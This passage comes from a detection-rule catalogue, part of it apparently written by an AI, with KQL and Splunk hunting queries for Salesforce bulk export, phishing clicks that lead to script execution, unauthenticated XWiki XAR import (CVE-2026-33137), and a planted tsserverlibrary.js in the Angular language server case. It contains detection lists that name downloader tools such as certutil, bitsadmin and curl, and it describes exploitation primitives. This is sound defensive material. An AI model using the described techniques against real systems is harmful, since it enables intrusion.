            AnyAnon = max(tostring(IsAnonymousProxy)),
            SampleAction = any(ActionType),
            SrcIPs = make_set(IPAddress, 10),
            ISPs = make_set(ISP, 10)
            by AccountDisplayName, AccountId, bin(Timestamp, WindowMinutes)
| where ExportEvents > 50    // 50 export ops / 10 min = bulk-pull burst, well above interactive baseline
| order by ExportEvents desc
APPLICATION
index=salesforce (EVENT_TYPE="BulkApi" OR EVENT_TYPE="ReportExport" OR EVENT_TYPE="RestApi" OR action="MassDownload") | bin _time span=10m | stats sum(ROW_COUNT) as rows dc(EVENT_TYPE) as evtypes values(SOURCE_IP) as src by USER_NAME, _time | where rows > 100000 | sort - rows
Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc

[LLM] XWiki unauthenticated XAR import via REST POST /rest/wikis/{wikiName} (CVE-2026-33137) Exploitation High
Hunts successful, unauthenticated HTTP POST requests to the XWiki REST XAR-import endpoint (/xwiki/rest/wikis/{wikiName}[/]) that return 2xx, which is exactly the exploitation primitive in CVE-2026-33137 — the import runs with no auth/authz check, letting an attacker create or update wiki documents. The Authorization-header-absent + 2xx-status combination separates exploitation from legitimate authenticated XAR imports performed by admins/migration tooling. Rationale: Built directly on the advisory's exact exploitation primitive — POST to /wikis/{wikiName} performing a XAR import with no auth check. Confirmed via XWiki docs/dev list that the real path is /xwiki/rest/wikis/{wikiName} (POST, optional ?backup=&history= params, XAR in body), so the regex on /rest/wikis/<single-segment> plus 2xx plus absent Authorization header is high-fidelity for unauthenticated exploitation vs legitimate authenticated imports. Cross-checked against: • https://github.com/advisories/GHSA-qrvh-r3f2-9h4r • https://jira.xwiki.org/browse/XWIKI-23953 • https://www.xwiki.org/xwiki/bin/view/Documentation/UserGuide/Features/XWikiRESTfulAPI • https://devs.xwiki.narkive.com/KEuNSQkQ/xwiki-vote-add-rest-api-to-import-a-xar-file
ATT&CKT1190
Data sourcesWeb.Web
ImWebSession
| where TimeGenerated > ago(7d)
| where HttpMethod =~ "POST"
| where Url matches regex @"(?i)/rest/wikis/[^/?#]+/?($|\?)"   // /xwiki/rest/wikis/{wikiName}[/] XAR-import endpoint
| where tostring(HttpStatusCode) in ("200","202")            // import accepted/succeeded
| where isempty(HttpRequestHeaderAuthorization)              // CVE-2026-33137: import runs with NO auth header
| project TimeGenerated, SrcIpAddr, DvcHostname, HttpMethod, Url, HttpStatusCode, HttpRequestHeaderUserAgent, HttpRequestBodyBytes
| order by TimeGenerated desc

[LLM] Planted tsserverlibrary.js + tsdk settings in cloned repo (Angular ng-template RCE) Delivery Medium
Hunts the GHSA-ccq4-xmxr-8hcq tsdk attack artifact: a malicious tsserverlibrary.js dropped inside a project/workspace directory (outside the canonical typescript\lib install path) so the Angular Language Service extension loads it via Node require() on project open. Pairs with a .vscode/settings.json carrying typescript.tsdk / js/ts.tsdk.path keys. Article-specific because legit tsserverlibrary.js only ever lives under node_modules\typescript\lib. Rationale: Anchors on the exact payload filename tsserverlibrary.js (named in article + Cryptika) and the high-fidelity discriminator that the legitimate SDK file only resides under typescript\lib; anything elsewhere is the planted require() target. Cross-checked against: • https://cybersecuritynews.com/angular-extension-vulnerabilities/ • https://www.cryptika.com/multiple-angular-language-service-extension-vulnerabilities-enable-rce-attacks/

[LLM] Angular language-server node launched with --tsdk pointing outside typescript\lib Exploitation High
Detects the GHSA-ccq4-xmxr-8hcq trigger: VS Code's Angular Language Service spawns the background Node.js language server with a --tsdk argument read from untrusted workspace .vscode/settings.json. Flags when the --tsdk path does NOT resolve under a typescript\lib directory, indicating the server will require() an attacker-controlled tsserverlibrary.js on project open with no user interaction. Rationale: Uses the exact --tsdk argument (corroborated by Cryptika) plus the language-server scoping tokens, and the high-fidelity rule that legitimate tsdk paths always terminate in typescript\lib while the exploit points --tsdk at an arbitrary repo directory. Cross-checked against: • https://cybersecuritynews.com/angular-extension-vulnerabilities/ • https://www.cryptika.com/multiple-angular-language-service-extension-vulnerabilities-enable-rce-attacks/
ATT&CKT1574 T1059.007 T1204.002
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(7d)
| where FileName =~ "node.exe"
| where ProcessCommandLine has "--tsdk"
// scope to the Angular language server / VS Code extension host
| where ProcessCommandLine has_any ("ngserver","ng-template","angular","Angular.ng-template")
   or InitiatingProcessFileName =~ "Code.exe"
   or InitiatingProcessParentFileName =~ "Code.exe"
// legit tsdk always ends in ...\typescript\lib
| where not(ProcessCommandLine has @"\typescript\lib" or ProcessCommandLine has "/typescript/lib")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName,
          ParentImage = InitiatingProcessFolderPath,
          ParentCmd = InitiatingProcessCommandLine,
          ProcessCommandLine, SHA256
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where NewProcessName endswith "\\node.exe"
| where CommandLine has "--tsdk"
| where CommandLine has_any ("ngserver","ng-template","angular","Angular.ng-template") or ParentProcessName endswith "\\Code.exe"
| where not(CommandLine has @"\typescript\lib" or CommandLine has "/typescript/lib")
| where SubjectUserName !endswith "$"
| project TimeGenerated, Computer, SubjectUserName, ParentProcessName, NewProcessName, CommandLine
| order by TimeGenerated desc
